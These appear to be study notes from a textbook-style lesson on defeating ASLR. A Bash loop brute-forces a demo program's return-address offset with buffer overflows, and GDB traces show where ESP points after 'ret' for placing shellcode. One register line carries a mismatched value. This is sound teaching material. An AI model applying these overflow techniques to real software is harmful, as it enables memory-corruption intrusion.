Since ASLR doesn't stop the memory corruption, we can still use a brute-forcing BASH script to figure out the offset to the return address from the beginning of the buffer
When a program exits, the value returned from the main function is the exit status
This status is stored in the BASH variabe $?, which can be used to detect whether the program crashed

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./aslr_demo test
buffer is at 0xbfb80320
reader@hacking:~/booksrc $ echo $?
1

reader@hacking:~/booksrc $ ./aslr_demo $(perl -e 'print "AAAA"x50')
buffer is at 0xbfbe2ac0
Segmentation fault
reader@hacking:~/booksrc $ echo $?
139
__________________________________________________________________________________

Using BASH's if statement logic, we can stop our brute-forcing script when it crashes the target
The if statement block is contained between the keywords then and fi; the whitespace in the if statement is required
The break statement tells the script to break out of the for loop

__________________________________________________________________________________
reader@hacking:~/booksrc $ for i in $(seq 1 50)
> do
> echo "Trying offset of $i words"
> ./aslr_demo $(perl -e "print 'AAAA'x$i")
> if [ $? != 1 ]
> then
> echo "==> Correct offset to return address is $i words"
> break
> fi
> done
Trying offset of 1 words
buffer is at 0xbfc093b0
Trying offset of 2 words
buffer is at 0xbfd01ca0
Trying offset of 3 words
buffer is at 0xbfe45de0
Trying offset of 4 words
buffer is at 0xbfdcd560
Trying offset of 5 words
buffer is at 0xbfbf5380
Trying offset of 6 words
buffer is at 0xbffce760
Trying offset of 7 words
buffer is at 0xbfaf7a80
Trying offset of 8 words
buffer is at 0xbfa4e9d0
Trying offset of 9 words
buffer is at 0xbfacca50
Trying offset of 10 words
buffer is at 0xbfd08c80
Trying offset of 11 words
buffer is at 0xbff24ea0
Trying offset of 12 words
buffer is at 0xbfaf9a70
Trying offset of 13 words
buffer is at 0xbfe0fd80
Trying offset of 14 words
buffer is at 0xbfe03d70
Trying offset of 15 words
buffer is at 0xbfc2fb90
Trying offset of 16 words
buffer is at 0xbff32a40
Trying offset of 17 words
buffer is at 0xbf9da940
Trying offset of 18 words
buffer is at 0xbfd0cc70
Trying offset of 19 words
buffer is at 0xbf897ff0
Illegal instruction
==> Correct offset to return address is 19 words
__________________________________________________________________________________

Knowing the proper offset will let us overwrite the return address
However, we still cannot execute shellcode since its location is randomized
Using GDB, let's look at the program just as it's about to return from the main function

__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q ./aslr_demo
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) disass main
Dump of assembler code for function main:
0x080483b4 <main+0>:    push    ebp 
0x080483b5 <main+1>:    mov     ebp,esp 
0x080483b7 <main+3>:    sub     esp,0x58 
0x080483ba <main+6>:    and     esp,0xfffffff0 
0x080483bd <main+9>:    mov     eax,0x0 
0x080483c2 <main+14>:   sub     esp,eax 
0x080483c4 <main+16>:   lea     eax,[ebp-72] 
0x080483c7 <main+19>:   mov     DWORD PTR [esp+4],eax 
0x080483cb <main+23>:   mov     DWORD PTR [esp],0x80484d4 
0x080483d2 <main+30>:   call    0x80482d4 <printf@plt> 
0x080483d7 <main+35>:   cmp     DWORD PTR [ebp+8],0x1 
0x080483db <main+39>:   jle     0x80483f4 <main+64> 
0x080483dd <main+41>:   mov     eax,DWORD PTR [ebp+12] 
0x080483e0 <main+44>:   add     eax,0x4 
0x080483e3 <main+47>:   mov     eax,DWORD PTR [eax] 
0x080483e5 <main+49>:   mov     DWORD PTR [esp+4],eax 
0x080483e9 <main+53>:   lea     eax,[ebp-72] 
0x080483ec <main+56>:   mov     DWORD PTR [esp],eax 
0x080483ef <main+59>:   call    0x80482c4 <strcpy@plt> 
0x080483f4 <main+64>:   mov     eax,0x1 
0x080483f9 <main+69>:   leave    
0x080483fa <main+70>:   ret   
End of assembler dump.

(gdb) break *0x080483fa
Breakpoint 1 at 0x80483fa: file aslr_demo.c, line 12.
__________________________________________________________________________________

The breakpoint is set at the last instruction of main
This instruction returns EIP to the return address stored on the stack
When an exploit overwrites the return address, this is the last instruction where the original program has control
Let's take a look at the registers at this point in the code for a couple of different trial runs

__________________________________________________________________________________
(gdb) run
Starting program: /home/reader/booksrc/aslr_demo

                    ________
      buffer is at |0xbfa131|a0
                   |________|

Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12
12       }

(gdb) info registers
eax       0x1      1   
ecx       0x0      0   
edx       0xb7f000b0     -1209007952 
ebx       0xb7efeff4     -1209012236 
                ________
      esp      |0xbfa131|ec     0xbfa131ec 
               |________|

ebp       0xbfa13248     0xbfa13248 
esi       0xb7f29ce0     -1208836896 
edi       0x0      0   
eip       0x80483fa      0x80483fa <main+70>
eflags    0x200246 [ PF ZF IF ID ]
cs        0x73     115 
ss        0x7b     123 
ds        0x7b     123 
es        0x7b     123 
fs        0x0      0 
gs        0x33     51 


(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/reader/booksrc/aslr_demo

                    ________
      buffer is at |0xbfd8e5|20
                   |________|

Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12
12       }

(gdb) i r esp

             ________
esp         |0xbfd8e5|6c          0xbfd8e56c
            |________|




(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/reader/booksrc/aslr_demo

                    ________
      buffer is at |0xbfaada|40
                   |________|

Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12
12       }

(gdb) i r esp

             ________
esp         |0xbfaada|8c          0xbfd8e56c
            |________|
__________________________________________________________________________________

Despite the randomization between runs, notice how similar the address in ESP is to the address of the buffer (marked)
This makes sense, since the stack pointer points to the stack and the buffer is on the stack
ESP's value and the buffer's address are changed by the same random value, because they are relative to each other

GDB's stepi command steps through the program forward in execution by a single instruction
Using this, we can check ESP's value after the ret instruction has executed

__________________________________________________________________________________
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/reader/booksrc/aslr_demo
buffer is at 0xbfd1ccb0

Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12
12       }

(gdb) i r esp
esp         0xbfd1ccfc         0xbfd1ccfc

(gdb) stepi
0xb7e4debc in __libc_start_main () from /lib/tls/i686/cmov/libc.so.6

(gdb) i r esp
esp         0xbfd1cd00         0xbfd1cd00

(gdb) x/24x 0xbfd1ccb0
0xbfd1ccb0:     0x00000000    0x080495cc   0xbfd1ccc8    0x08048291 
0xbfd1ccc0:     0xb7f3d729    0xb7f74ff4   0xbfd1ccf8    0x08048429 
0xbfd1ccd0:     0xb7f74ff4    0xbfd1cd8c   0xbfd1ccf8    0xb7f74ff4 
0xbfd1cce0:     0xb7f937b0    0x08048410   0x00000000    0xb7f74ff4 
0xbfd1ccf0:     0xb7f9fce0    0x08048410   0xbfd1cd58    0xb7e4debc 
0xbfd1cd00:     0x00000001    0xbfd1cd84   0xbfd1cd8c    0xb7fa0898 

(gdb) p 0xbfd1cd00 - 0xbfd1ccb0
$1 = 80
(gdb) p 80/4
$2 = 20
__________________________________________________________________________________

Single stepping shows that the ret instruction increases the value of ESP by 4
Subtracting the value of ESP from the address of the buffer, we find that ESP is pointing 80 bytes (or 20 words) from the start of the buffer
Since the return address's offset was 19 words, this means that after main's final ret instruction, ESP points to stack memory found directly after the return address
This would be useful if there was a way to control EIP to go where ESP is pointing instead

      What we did is in the first part, we found out that the return address is at 19 word(19*4 bytes) from the buffer address

      We can't use the return address as we don't know the address of the shellcode

      Then, when the program ends with the ret instruction, ESP points to the 20th word(20*4 bytes) from the buffer address
      Here, if we could point EIP to ESP, we could add shellcode after return address and it would be executed